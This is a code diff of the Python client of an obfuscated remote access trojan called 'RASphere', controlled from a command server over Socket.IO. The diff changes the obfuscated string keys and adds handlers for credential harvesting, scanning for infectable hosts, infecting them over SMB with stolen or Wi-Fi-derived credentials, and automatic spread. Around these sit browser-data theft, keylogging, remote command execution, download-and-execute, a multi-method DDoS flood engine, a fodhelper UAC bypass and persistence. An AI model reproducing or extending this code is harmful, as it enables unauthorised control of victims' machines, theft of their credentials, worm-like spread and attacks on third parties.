-        else: sio.emit(_D("_s480"), {"error": "N/A"})
-    @sio.on(_D("_s481"))
+        if HAS[_D("_s621")]:
+            try: sio.emit(_D("_s622"), {"text": pyperclip.paste()})
+            except Exception as e: sio.emit(_D("_s623"), {"error": str(e)})
+        else: sio.emit(_D("_s624"), {"error": "N/A"})
+    @sio.on(_D("_s625"))
     def _cs(d):
-        if HAS[_D("_s482")]:
-            try: pyperclip.copy((d or {}).get(_D("_s483"),"")); sio.emit("clipboard_status", {"ok": True})
-            except Exception as e: sio.emit(_D("_s484"), {"ok": False, "error": str(e)})
-        else: sio.emit(_D("_s485"), {"ok": False, "error": "N/A"})
-    @sio.on(_D("_s486"))
-    def _ag(): r = _audio(); sio.emit(_D("_s487"), r or {"error": "N/A"})
-    @sio.on(_D("_s488"))
-    def _as(d): lv = (d or {}).get(_D("_s489"),50); ok = _avol(int(lv)); sio.emit("audio_status", {"ok": ok, "volume": int(lv)})
-    @sio.on(_D("_s490"))
-    def _am(): ok = _amute(); r = _audio(); sio.emit(_D("_s491"), r or {"error": "N/A"})
-    @sio.on(_D("_s492"))
-    def _pmo(): ok = _monoff(); sio.emit(_D("_s493"), {"action": "monitor_off", "ok": ok})
-    @sio.on(_D("_s494"))
-    def _pl(): ok = _lock(); sio.emit(_D("_s495"), {"action": "lock", "ok": ok})
-    @sio.on(_D("_s496"))
-    def _ps(): ok = _sleep(); sio.emit(_D("_s497"), {"action": "sleep", "ok": ok})
-    @sio.on(_D("_s498"))
-    def _wp(d): ok, msg = _wallpaper((d or {}).get(_D("_s499"),"")); sio.emit("cmd_result", {"cmd": "wallpaper", "ok": ok, "message": msg})
-    @sio.on(_D("_s500"))
-    def _mb(d): ok, msg = _msgbox((d or {}).get(_D("_s501"),"RASphere"), (d or {}).get("text","Hello!")); sio.emit("cmd_result", {"cmd": "msgbox", "ok": ok, "message": msg})
-    @sio.on(_D("_s502"))
-    def _ou(d): ok, msg = _openurl((d or {}).get("url","")); sio.emit(_D("_s503"), {"cmd": "openurl", "ok": ok, "message": msg})
-    @sio.on(_D("_s504"))
-    def _tss(): data, fmt = _screenshot(); sio.emit(_D("_s505"), {"data": data, "format": fmt} if data else {"error": fmt})
-    @sio.on(_D("_s506"))
-    def _geo(): sio.emit(_D("_s507"), _geoip())
-    @sio.on(_D("_s508"))
-    def _ga(): sio.emit(_D("_s509"), {"apps": _apps()})
-    @sio.on(_D("_s510"))
-    def _psnd(d): ok, msg = _play_sound((d or {}).get(_D("_s511"),800), (d or {}).get("dur",1)); sio.emit("cmd_result", {"cmd": "sound", "ok": ok, "message": msg})
-    @sio.on(_D("_s512"))
-    def _sf(d): r = _search_files((d or {}).get(_D("_s513"),"C:\\"), (d or {}).get("pattern","*"), (d or {}).get("max",50)); sio.emit("search_result", {"results": r})
-    @sio.on(_D("_s514"))
-    def _ec(d): out, rc = _execute_command((d or {}).get(_D("_s515"),"")); sio.emit("execute_result", {"output": out, "code": rc})
-    @sio.on(_D("_s516"))
-    def _de(d): ok, msg = _download_exec((d or {}).get("url",""), (d or {}).get(_D("_s517"))); sio.emit("cmd_result", {"cmd": "download_exec", "ok": ok, "message": msg})
-    @sio.on(_D("_s518"))
-    def _ib(d=None): ok, msg = _block_input(True); sio.emit(_D("_s519"), {"cmd": "input_block", "ok": ok, "message": msg})
-    @sio.on(_D("_s520"))
-    def _iub(d=None): ok, msg = _block_input(False); sio.emit(_D("_s521"), {"cmd": "input_unblock", "ok": ok, "message": msg})
-    @sio.on(_D("_s522"))
-    def _fl(d): sio.emit(_D("_s523"), _flist((d or {}).get("path","")))
-    @sio.on(_D("_s524"))
-    def _fdr(d): sio.emit(_D("_s525"), {**_fread((d or {}).get("path",""), (d or {}).get("offset",0)), "path": (d or {}).get("path","")})
-    @sio.on(_D("_s526"))
-    def _fd(d): ok, msg = _fdel((d or {}).get(_D("_s527"),"")); sio.emit("file_delete_result", {"ok": ok, "message": msg})
-    @sio.on(_D("_s528"))
-    def _fnf(d): ok, msg = _fmkdir((d or {}).get(_D("_s529"),""), (d or {}).get("name","New Folder")); sio.emit("file_new_folder_result", {"ok": ok, "message": msg})
-    @sio.on(_D("_s530"))
+        if HAS[_D("_s626")]:
+            try: pyperclip.copy((d or {}).get(_D("_s627"),"")); sio.emit("clipboard_status", {"ok": True})
+            except Exception as e: sio.emit(_D("_s628"), {"ok": False, "error": str(e)})
+        else: sio.emit(_D("_s629"), {"ok": False, "error": "N/A"})
+    @sio.on(_D("_s630"))
+    def _ag(): r = _audio(); sio.emit(_D("_s631"), r or {"error": "N/A"})
+    @sio.on(_D("_s632"))
+    def _as(d): lv = (d or {}).get(_D("_s633"),50); ok = _avol(int(lv)); sio.emit("audio_status", {"ok": ok, "volume": int(lv)})
+    @sio.on(_D("_s634"))
+    def _am(): ok = _amute(); r = _audio(); sio.emit(_D("_s635"), r or {"error": "N/A"})
+    @sio.on(_D("_s636"))
+    def _pmo(): ok = _monoff(); sio.emit(_D("_s637"), {"action": "monitor_off", "ok": ok})
+    @sio.on(_D("_s638"))
+    def _pl(): ok = _lock(); sio.emit(_D("_s639"), {"action": "lock", "ok": ok})
+    @sio.on(_D("_s640"))
+    def _ps(): ok = _sleep(); sio.emit(_D("_s641"), {"action": "sleep", "ok": ok})
+    @sio.on(_D("_s642"))
+    def _wp(d): ok, msg = _wallpaper((d or {}).get(_D("_s643"),"")); sio.emit("cmd_result", {"cmd": "wallpaper", "ok": ok, "message": msg})
+    @sio.on(_D("_s644"))
+    def _mb(d): ok, msg = _msgbox((d or {}).get(_D("_s645"),"RASphere"), (d or {}).get("text","Hello!")); sio.emit("cmd_result", {"cmd": "msgbox", "ok": ok, "message": msg})
+    @sio.on(_D("_s646"))
+    def _ou(d): ok, msg = _openurl((d or {}).get("url","")); sio.emit(_D("_s647"), {"cmd": "openurl", "ok": ok, "message": msg})
+    @sio.on(_D("_s648"))
+    def _tss(): data, fmt = _screenshot(); sio.emit(_D("_s649"), {"data": data, "format": fmt} if data else {"error": fmt})
+    @sio.on(_D("_s650"))
+    def _geo(): sio.emit(_D("_s651"), _geoip())
+    @sio.on(_D("_s652"))
+    def _ga(): sio.emit(_D("_s653"), {"apps": _apps()})
+    @sio.on(_D("_s654"))
+    def _psnd(d): ok, msg = _play_sound((d or {}).get(_D("_s655"),800), (d or {}).get("dur",1)); sio.emit("cmd_result", {"cmd": "sound", "ok": ok, "message": msg})
+    @sio.on(_D("_s656"))
+    def _sf(d): r = _search_files((d or {}).get(_D("_s657"),"C:\\"), (d or {}).get("pattern","*"), (d or {}).get("max",50)); sio.emit("search_result", {"results": r})
+    @sio.on(_D("_s658"))
+    def _ec(d): out, rc = _execute_command((d or {}).get(_D("_s659"),"")); sio.emit("execute_result", {"output": out, "code": rc})
+    @sio.on(_D("_s660"))
+    def _de(d): ok, msg = _download_exec((d or {}).get("url",""), (d or {}).get(_D("_s661"))); sio.emit("cmd_result", {"cmd": "download_exec", "ok": ok, "message": msg})
+    @sio.on(_D("_s662"))
+    def _ib(d=None): ok, msg = _block_input(True); sio.emit(_D("_s663"), {"cmd": "input_block", "ok": ok, "message": msg})
+    @sio.on(_D("_s664"))
+    def _iub(d=None): ok, msg = _block_input(False); sio.emit(_D("_s665"), {"cmd": "input_unblock", "ok": ok, "message": msg})
+    @sio.on(_D("_s666"))
+    def _fl(d): sio.emit(_D("_s667"), _flist((d or {}).get("path","")))
+    @sio.on(_D("_s668"))
+    def _fdr(d): sio.emit(_D("_s669"), {**_fread((d or {}).get("path",""), (d or {}).get("offset",0)), "path": (d or {}).get("path","")})
+    @sio.on(_D("_s670"))
+    def _fd(d): ok, msg = _fdel((d or {}).get(_D("_s671"),"")); sio.emit("file_delete_result", {"ok": ok, "message": msg})
+    @sio.on(_D("_s672"))
+    def _fnf(d): ok, msg = _fmkdir((d or {}).get(_D("_s673"),""), (d or {}).get("name","New Folder")); sio.emit("file_new_folder_result", {"ok": ok, "message": msg})
+    @sio.on(_D("_s674"))
     def _fuc(d):
-        path = (d or {}).get(_D("_s531"),""); chunk = (d or {}).get("data",""); offset = (d or {}).get("offset",0)
+        path = (d or {}).get(_D("_s675"),""); chunk = (d or {}).get("data",""); offset = (d or {}).get("offset",0)
         mode = "wb" if offset == 0 else "ab"
         ok, msg = _fwrite(path, chunk, offset, mode)
-        sio.emit(_D("_s532"), {"ok": ok, "message": msg, "path": path})
-    @sio.on(_D("_s533"))
-    def _ninfo(d=None): sio.emit(_D("_s534"), _network_info())
-    @sio.on(_D("_s535"))
+        sio.emit(_D("_s676"), {"ok": ok, "message": msg, "path": path})
+    @sio.on(_D("_s677"))
+    def _ninfo(d=None): sio.emit(_D("_s678"), _network_info())
+    @sio.on(_D("_s679"))
     def _bs(d=None):
-        _l.info(_D("_s536"))
+        _l.info(_D("_s680"))
         result = _browser_steal()
-        sio.emit(_D("_s537"), result)
-    @sio.on(_D("_s538"))
+        sio.emit(_D("_s681"), result)
+    @sio.on(_D("_s682"))
+    def _ch(d=None):
+        _l.info(_D("_s683"))
+        threading.Thread(target=lambda: (sio.emit(_D("_s684"), _credential_harvest())), daemon=True).start()
+    @sio.on(_D("_s685"))
+    def _iscan(d=None):
+        _l.info(_D("_s686"))
+        subnets = (d or {}).get(_D("_s687"), None)
+        threading.Thread(target=lambda: (sio.emit(_D("_s688"), _scan_infectable_targets(subnets))), daemon=True).start()
+    @sio.on(_D("_s689"))
+    def _istart(d=None):
+        d = d or {}
+        target_ip = d.get(_D("_s690"), "")
+        username = d.get(_D("_s691"), "")
+        password = d.get(_D("_s692"), "")
+        method = d.get(_D("_s693"), "auto")
+        _l.info(f"Infection requested: {target_ip} with {username}")
+        def _do_infect():
+            result = _infect_target(target_ip, username, password, method)
+            sio.emit(_D("_s694"), result)
+        threading.Thread(target=_do_infect, daemon=True).start()
+    @sio.on(_D("_s695"))
+    def _itest(d=None):
+        d = d or {}
+        target_ip = d.get(_D("_s696"), "")
+        username = d.get(_D("_s697"), "")
+        password = d.get(_D("_s698"), "")
+        def _do_test():
+            ok = _test_smb_credentials(target_ip, username, password)
+            sio.emit(_D("_s699"), {"target": target_ip, "username": username, "success": ok})
+        threading.Thread(target=_do_test, daemon=True).start()
+    @sio.on(_D("_s700"))
+    def _winfect(d=None):
+        d = d or {}
+        ssid = d.get(_D("_s701"), "")
+        password = d.get(_D("_s702"), "")
+        if not ssid or not password:
+            sio.emit(_D("_s703"), {"error": "SSID and password required"})
+            return
+        _l.info(f"WiFi neighbor infection: {ssid}")
+        def _do_wifi():
+            result = _wifi_connect_and_infect(ssid, password)
+            sio.emit(_D("_s704"), result)
+        threading.Thread(target=_do_wifi, daemon=True).start()
+    @sio.on(_D("_s705"))
+    def _iauto(d=None):
+        ""_D("_s706")""
+        _l.info(_D("_s707"))
+        def _do_auto():
+            wifi_data = _wifi_passwords()
+            scan_data = _scan_infectable_targets()
+            creds = _build_credential_list(wifi_data)
+            targets = scan_data.get(_D("_s708"), [])
+            sio.emit(_D("_s709"), scan_data)
+            sio.emit(_D("_s710"), {"phase": "trying_credentials", "total": len(targets), "creds": len(creds)})
+            successful = _auto_try_credentials(targets, creds)
+            sio.emit(_D("_s711"), {"successful": successful, "targets_scanned": len(targets), "credentials_tried": len(creds)})
+            for entry in successful:
+                result = _infect_target(entry[_D("_s712")], entry["username"], entry["password"], "auto")
+                sio.emit(_D("_s713"), result)
+        threading.Thread(target=_do_auto, daemon=True).start()
+    @sio.on(_D("_s714"))
     def _ddos_start(d=None):
         d = d or {}
-        target = d.get(_D("_s539"), "")
-        port = d.get(_D("_s540"), 80)
-        threads = d.get(_D("_s541"), 50)
-        pkt_size = d.get(_D("_s542"), 1024)
-        method = d.get(_D("_s543"), "tcp")
+        target = d.get(_D("_s715"), "")
+        port = d.get(_D("_s716"), 80)
+        threads = d.get(_D("_s717"), 50)
+        pkt_size = d.get(_D("_s718"), 1024)
+        method = d.get(_D("_s719"), "tcp")
         if not target:
-            sio.emit(_D("_s544"), {"active": False, "error": "No target specified"})
+            sio.emit(_D("_s720"), {"active": False, "error": "No target specified"})
             return
         _l.info(f"DDoS start: {method} -> {target}:{port} ({threads} threads)")
         ddos.start(target, port=port, threads=threads, packet_size=pkt_size, method=method)
-    @sio.on(_D("_s545"))
+    @sio.on(_D("_s721"))
     def _ddos_stop(d=None):
         ddos.stop()
-    @sio.on(_D("_s546"))
+    @sio.on(_D("_s722"))
     def _ks(d=None):
-        _l.warning(_D("_s547")); sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop(); ddos.stop(); sio.disconnect(); os._exit(0)
+        _l.warning(_D("_s723")); sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop(); ddos.stop(); sio.disconnect(); os._exit(0)
 class DdosEngine:
-    ""_D("_s548")""
+    ""_D("_s724")""
     def __init__(self, sio):
         self.r = False; self.sio = sio
-        self.threads = []; self.stats = {_D("_s549"): 0, "data_bytes": 0, "start_time": 0}
+        self.threads = []; self.stats = {_D("_s725"): 0, "data_bytes": 0, "start_time": 0}
         self._lock = threading.Lock(); self._target = ""; self._port = 80
     def start(self, target, port=80, threads=50, packet_size=1024, method="tcp"):
         if self.r: self.stop()
@@ -2108,7 +2181,7 @@ class DdosEngine:
         port = max(1, min(65535, port))
         self.r = True
         self._target = target; self._port = port
-        self.stats = {_D("_s550"): 0, "data_bytes": 0, "start_time": time.time()}
+        self.stats = {_D("_s726"): 0, "data_bytes": 0, "start_time": time.time()}
         _l.info(f"DDoS starting: {method} flood -> {target}:{port} ({threads} threads)")
         try:
             self._target_ip = socket.gethostbyname(target)
@@ -2120,7 +2193,7 @@ class DdosEngine:
             self.threads.append(t)
         threading.Thread(target=self._stats_reporter, daemon=True).start()
         if self.sio and self.sio.connected:
-            self.sio.emit(_D("_s551"), {"active": True, "target": f"{target}:{port}", "method": method, "threads": threads})
+            self.sio.emit(_D("_s727"), {"active": True, "target": f"{target}:{port}", "method": method, "threads": threads})
     def stop(self):
         self.r = False
         for t in self.threads:
@@ -2128,11 +2201,11 @@ class DdosEngine:
                 t.join(timeout=1)
         self.threads = []
         if self.sio and self.sio.connected:
-            self.sio.emit(_D("_s552"), {"active": False})
-        _l.info(_D("_s553"))
+            self.sio.emit(_D("_s728"), {"active": False})
+        _l.info(_D("_s729"))
     def _worker(self, method, pkt_size, tid):
-        ""_D("_s554")""
-        payload = os.urandom(pkt_size) if method != _D("_s555") else None
+        ""_D("_s730")""
+        payload = os.urandom(pkt_size) if method != _D("_s731") else None
         if method == "tcp":
             while self.r:
                 try:
@@ -2142,11 +2215,11 @@ class DdosEngine:
                     s.send(payload[:min(pkt_size, 65536)])
                     s.close()
                     with self._lock:
-                        self.stats[_D("_s556")] += 1
-                        self.stats[_D("_s557")] += pkt_size
+                        self.stats[_D("_s732")] += 1
+                        self.stats[_D("_s733")] += pkt_size
                 except:
                     with self._lock:
-                        self.stats[_D("_s558")] += 1
+                        self.stats[_D("_s734")] += 1
         elif method == "udp":
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -2154,29 +2227,29 @@ class DdosEngine:
                     try:
                         s.sendto(payload[:min(pkt_size, 65507)], (self._target_ip, self._port))
                         with self._lock:
-                            self.stats[_D("_s559")] += 1
-                            self.stats[_D("_s560")] += pkt_size
+                            self.stats[_D("_s735")] += 1
+                            self.stats[_D("_s736")] += pkt_size
                     except:
                         with self._lock:
-                            self.stats[_D("_s561")] += 1
+                            self.stats[_D("_s737")] += 1
                 s.close()
             except:
                 pass
-        elif method == _D("_s562"):
+        elif method == _D("_s738"):
             url = f"{self._target}:{self._port}" if self._port != 80 and self._port != 443 else self._target
-            proto = _D("_s563") if self._port == 443 else "http"
+            proto = _D("_s739") if self._port == 443 else "http"
             full_url = f"{proto}://{url}/"
             while self.r:
                 try:
                     r = urllib.request.urlopen(full_url, timeout=3)
                     data = r.read()
                     with self._lock:
-                        self.stats[_D("_s564")] += 1
-                        self.stats[_D("_s565")] += len(data)
+                        self.stats[_D("_s740")] += 1
+                        self.stats[_D("_s741")] += len(data)
                 except:
                     with self._lock:
-                        self.stats[_D("_s566")] += 1
-        elif method == _D("_s567"):
+                        self.stats[_D("_s742")] += 1
+        elif method == _D("_s743"):
             sockets_held = []
             try:
                 while self.r:
@@ -2187,7 +2260,7 @@ class DdosEngine:
                         s.send(f"GET / HTTP/1.1\r\nHost: {self._target}\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\n".encode())
                         sockets_held.append(s)
                         with self._lock:
-                            self.stats[_D("_s568")] += 1
+                            self.stats[_D("_s744")] += 1
                         if len(sockets_held) > 200:
                             old = sockets_held.pop(0)
                             try: old.close()
@@ -2202,65 +2275,65 @@ class DdosEngine:
                     try: s.close()
                     except: pass
     def _stats_reporter(self):
-        ""_D("_s569")""
+        ""_D("_s745")""
         while self.r:
             time.sleep(2)
             if not self.r: break
             with self._lock:
-                elapsed = max(0.001, time.time() - self.stats[_D("_s570")])
-                pps = int(self.stats[_D("_s571")] / elapsed)
-                data_mb = self.stats[_D("_s572")] / (1024 * 1024)
+                elapsed = max(0.001, time.time() - self.stats[_D("_s746")])
+                pps = int(self.stats[_D("_s747")] / elapsed)
+                data_mb = self.stats[_D("_s748")] / (1024 * 1024)
                 if self.sio and self.sio.connected:
-                    self.sio.emit(_D("_s573"), {
-                        _D("_s574"): {
-                            _D("_s575"): self.stats["packets"],
+                    self.sio.emit(_D("_s749"), {
+                        _D("_s750"): {
+                            _D("_s751"): self.stats["packets"],
                             "pps": pps,
-                            _D("_s576"): round(data_mb, 2),
-                            _D("_s577"): int(elapsed)
+                            _D("_s752"): round(data_mb, 2),
+                            _D("_s753"): int(elapsed)
                         }
                     })
 def main():
-    p = argparse.ArgumentParser(description=_D("_s578"))
-    p.add_argument(_D("_s579"), default=None, help=f"Server URL (default: {_SERVER})")
-    p.add_argument(_D("_s580"), default=None, help=f"Client secret (default: ***)")
-    p.add_argument(_D("_s581"), default=None, help="Client ID (default: auto)")
-    p.add_argument(_D("_s582"), type=int, default=None, help=f"Reconnect delay (default: {_RECON}s)")
-    p.add_argument(_D("_s583"), action="store_true", help="Install persistence")
-    p.add_argument(_D("_s584"), action="store_true", help="Remove persistence")
-    p.add_argument(_D("_s585"), action="store_true", help="Skip auto-persistence")
-    p.add_argument(_D("_s586"), action="store_true", help=argparse.SUPPRESS)
-    p.add_argument(_D("_s587"), action="store_true", help="Skip UAC bypass on startup")
+    p = argparse.ArgumentParser(description=_D("_s754"))
+    p.add_argument(_D("_s755"), default=None, help=f"Server URL (default: {_SERVER})")
+    p.add_argument(_D("_s756"), default=None, help=f"Client secret (default: ***)")
+    p.add_argument(_D("_s757"), default=None, help="Client ID (default: auto)")
+    p.add_argument(_D("_s758"), type=int, default=None, help=f"Reconnect delay (default: {_RECON}s)")
+    p.add_argument(_D("_s759"), action="store_true", help="Install persistence")
+    p.add_argument(_D("_s760"), action="store_true", help="Remove persistence")
+    p.add_argument(_D("_s761"), action="store_true", help="Skip auto-persistence")
+    p.add_argument(_D("_s762"), action="store_true", help=argparse.SUPPRESS)
+    p.add_argument(_D("_s763"), action="store_true", help="Skip UAC bypass on startup")
     args = p.parse_args()
     url = args.server or _SERVER; secret = args.secret or _SECRET
     rec = args.reconnect if args.reconnect is not None else _RECON
     cid = args.id or _CLIENT_ID
     if args.uninstall:
-        if _up(): print(_D("_s588"))
-        else: print(_D("_s589"))
+        if _up(): print(_D("_s764"))
+        else: print(_D("_s765"))
         return
     if args.install:
-        if not url or not secret: print(_D("_s590")); sys.exit(1)
-        if _ip(url, secret, rec, cid): print(_D("_s591"))
-        else: print(_D("_s592"))
-    if sys.platform == _D("_s593") and not getattr(args, "no_elevate", False) and not getattr(args, "elevated", False):
+        if not url or not secret: print(_D("_s766")); sys.exit(1)
+        if _ip(url, secret, rec, cid): print(_D("_s767"))
+        else: print(_D("_s768"))
+    if sys.platform == _D("_s769") and not getattr(args, "no_elevate", False) and not getattr(args, "elevated", False):
         if not _is_admin():
-            _l.info(_D("_s594"))
+            _l.info(_D("_s770"))
             _fodhelper_uac_bypass(args)
-            print(_D("_s595"))
+            print(_D("_s771"))
         else:
-            _l.info(_D("_s596"))
-    if getattr(args, _D("_s597"), False):
-        _l.info(_D("_s598"))
+            _l.info(_D("_s772"))
+    if getattr(args, _D("_s773"), False):
+        _l.info(_D("_s774"))
         _cleanup_uac_registry()
     if not args.no_persist and not args.uninstall:
         try:
             if url and secret:
                 ok = _ip(url, secret, rec, cid)
-                if ok: print(_D("_s599"))
-                else: print(_D("_s600"))
+                if ok: print(_D("_s775"))
+                else: print(_D("_s776"))
         except Exception as e: print(f"[!] Auto-persist error: {e}")
-    if not url: print(_D("_s601")); sys.exit(1)
-    if not secret: print(_D("_s602")); sys.exit(1)
+    if not url: print(_D("_s777")); sys.exit(1)
+    if not secret: print(_D("_s778")); sys.exit(1)
     _s.url = url.rstrip("/"); _s.secret = secret
     _s.cid = cid or f"{socket.gethostname()}-{os.urandom(3).hex()}"
     _l.info(f"RASphere Client | ID: {_s.cid} | Server: {_s.url}")
@@ -2274,7 +2347,7 @@ def main():
         try:
             _l.info(f"Connecting to {_s.url}...")
             sio.connect(_s.url, wait_timeout=10)
-            _l.info(_D("_s603"))
+            _l.info(_D("_s779"))
             current_delay = rec
             if not update_checked:
                 new_ver, dl_url = _check_for_update(_s.url)
@@ -2283,16 +2356,16 @@ def main():
                     _l.info(f"New version {new_ver} available, applying update...")
                     ok = _download_and_install(dl_url, new_ver)
                     if ok:
-                        _l.info(_D("_s604"))
+                        _l.info(_D("_s780"))
                         sio.disconnect()
                         os._exit(0)
             sio.wait()
-        except KeyboardInterrupt: _l.info(_D("_s605")); break
+        except KeyboardInterrupt: _l.info(_D("_s781")); break
         except Exception as e:
             _l.error(f"Connection error: {e}")
             if not rec: break
             _l.info(f"Reconnecting in {current_delay}s...")
             time.sleep(current_delay)
             current_delay = min(current_delay * 2, _RECON_MAX)
-    sio.disconnect(); _l.info(_D("_s606"))
-if __name__ == _D("_s607"): main()
+    sio.disconnect(); _l.info(_D("_s782"))
+if __name__ == _D("_s783"): main()
